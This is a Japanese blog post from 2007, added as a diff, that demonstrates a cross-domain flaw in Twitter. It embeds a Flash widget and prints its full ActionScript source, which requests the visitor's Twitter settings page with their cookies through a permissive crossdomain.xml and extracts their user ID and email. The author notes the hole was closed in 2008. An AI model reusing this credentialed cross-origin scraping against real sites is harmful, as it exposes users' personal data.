@@ -1,0 +1,82 @@
+---
+layout: post
+title: ついったー足あとちょう
+tags: Twitter
+lang: ja
+old_url: http://d.hatena.ne.jp/nitoyon/20071113/twitter_tracker
+---
+ついったーの ID とメールアドレスを抜き出すよ！
+
+（追記）2008/3/9 18:00 crossdomain.xml が修正されて、抜き出せなくなったようです…。
+
+<script src="http://gmodules.com/ig/ifr?url=http://nitoyon.googlepages.com/embed_flash.xml&amp;up_url=http%3A%2F%2Ftech.nitoyon.com%2Fmisc%2Fswf%2FTwitterTracker.swf&amp;up_background=%23ffffff&amp;synd=open&amp;w=320&amp;h=80&amp;title=Twitter+Tracker&amp;border=%23ffffff%7C3px%2C1px+solid+%23999999&amp;output=js"></script>
+
+ソースはこんなの！（61行）
+>|javascript|
+package {
+    import flash.display.Sprite;
+    import flash.events.Event;
+    import flash.text.*;
+    import flash.net.*;
+
+    [SWF(width="400", height="100", backgroundColor="#ffffff")]
+    public class TwitterTracker extends Sprite {
+        private var textField:TextField;
+        
+        public function TwitterTracker() {
+            stage.scaleMode = "noScale";
+            stage.align = "TL";
+
+            var tf:TextFormat = new TextFormat();
+            tf.size = 15;
+
+            textField = new TextField();
+            textField.wordWrap = true;
+            textField.multiline = true;
+            textField.defaultTextFormat = tf;
+
+            textField.text = "loading...";
+            textField.width = 400;
+            addChild(textField);
+
+            var loader:URLLoader = new URLLoader();
+            loader.addEventListener(Event.COMPLETE, completeHandler);
+            loader.addEventListener("ioError", errorHandler);
+            loader.load(new URLRequest("http://twitter.com/account/settings"));
+        }
+
+        private function completeHandler(event:Event):void {
+            var loader:URLLoader = URLLoader(event.target);
+            var html:String = loader.data;
+            if(html.indexOf('value="Sign In"') != -1) {
+                // logged out
+                textField.text = "ついったーにはログインしてないみたい。\nYou are not logged in to Twitter!!";
+            }
+            else {
+                // login
+                var idMatch:Array = html.match(/<input\s+id="user_screen_name"[^>+]+value="([^"]+)"/);
+                var emailMatch:Array = html.match(/<input\s+id="user_email"[^>]+value="([^"]+)"/);
+
+                if(idMatch && emailMatch) {
+                    var id:String = idMatch[1];
+                    var email:String = emailMatch[1];
+                    textField.htmlText = "ついったーID は <font color='#ff0000'><b>" + id + "</b></font> だね。<br>"
+                      + "E-mail は <font color='#008000'><b>" + email + "</b></font> だよね。";
+                }
+                else {
+                    textField.text = "no match:" + idMatch + ":" + emailMatch;
+                }
+            }
+        }
+
+        private function errorHandler(event:Event):void {
+            textField.text = "Error!!!: " + event.toString();
+        }
+    }
+}
+||<
+
+いちおう補足しておくと、Cookie を抜いたわけではなくて、Cookie つきで twitter.com に GET した結果の HTML をパースしてるだけだよ。crossdomain.xml はすごいね！
+
+関連： <a href="http://d.hatena.ne.jp/nitoyon/20071112/crossdomain_img">AS で別ドメインの画像を読み込むときの注意点 - てっく煮ブログ</a>
+
